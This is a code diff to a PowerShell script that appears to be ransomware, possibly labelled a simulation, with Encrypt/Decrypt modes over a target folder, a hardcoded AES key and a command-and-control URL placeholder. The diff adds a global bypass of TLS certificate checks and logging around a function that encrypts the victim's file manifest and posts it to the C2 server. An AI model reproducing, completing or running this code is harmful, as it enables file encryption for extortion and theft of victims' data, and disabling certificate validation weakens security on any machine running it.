@@ -7,11 +7,19 @@
 #>
 
 param(
-    [Parameter(Mandatory=$true)][ValidateSet("Encrypt", "Decrypt")]$Mode, 
+    [Parameter(Mandatory=$true)]
+    [ValidateSet("Encrypt", "Decrypt")]
+    $Mode, 
+
     [string]$TargetPath = "C:\SimulationData", 
+
     [string]$C2Url = "https://YOUR_C2_IP/api/v1/telemetry",
+
     [int]$Timer = 60
 )
+
+# Place the SSL bypass immediately AFTER the param block
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 
 # Shared AES-256 Key (32 bytes)
 $Passphrase = "12345678901234567890123456789012"
@@ -83,14 +91,26 @@ function Invoke-ApexCipher {
 # Encrypts the victim's file manifest and sends it to the listener over HTTPS.
 function Send-ApexExfil {
     param ($DataManifest)
+    Write-Host "[*] Exfil Function Triggered. Preparing payload..." -ForegroundColor Cyan
+    
     $Json = $DataManifest | ConvertTo-Json
-    $Aes = [System.Security.Cryptography.Aes]::Create(); $Aes.Key = $KeyBytes; $Aes.GenerateIV()
-    $Enc = $Aes.CreateEncryptor(); $Payload = [System.Text.Encoding]::UTF8.GetBytes($Json)
+    $Aes = [System.Security.Cryptography.Aes]::Create()
+    $Aes.Key = $KeyBytes
+    $Aes.GenerateIV()
+    $Enc = $Aes.CreateEncryptor()
+    $Payload = [System.Text.Encoding]::UTF8.GetBytes($Json)
     $Cipher = $Enc.TransformFinalBlock($Payload, 0, $Payload.Length)
     $B64 = [Convert]::ToBase64String($Aes.IV + $Cipher)
+    
+    Write-Host "[*] Payload ready. Sending to: $C2Url" -ForegroundColor Cyan
     try {
-        Invoke-RestMethod -Uri $C2Url -Method Post -Body (@{payload=$B64}|ConvertTo-Json) -ContentType "application/json" -SkipCertificateCheck
-    } catch { }
+        # REMOVED -SkipCertificateCheck because PS 5.1 doesn't support it.
+        # The line at the top of the script handles the bypass globally.
+        $Response = Invoke-RestMethod -Uri $C2Url -Method Post -Body (@{payload=$B64}|ConvertTo-Json) -ContentType "application/json"
+        Write-Host "[+] SUCCESS: Server responded with $($Response.status)" -ForegroundColor Green
+    } catch {
+        Write-Host "[!!!] EXFIL ERROR: $($_.Exception.Message)" -ForegroundColor Red
+    }
 }
 
 # --- SECTION 4: MAIN EXECUTION ---
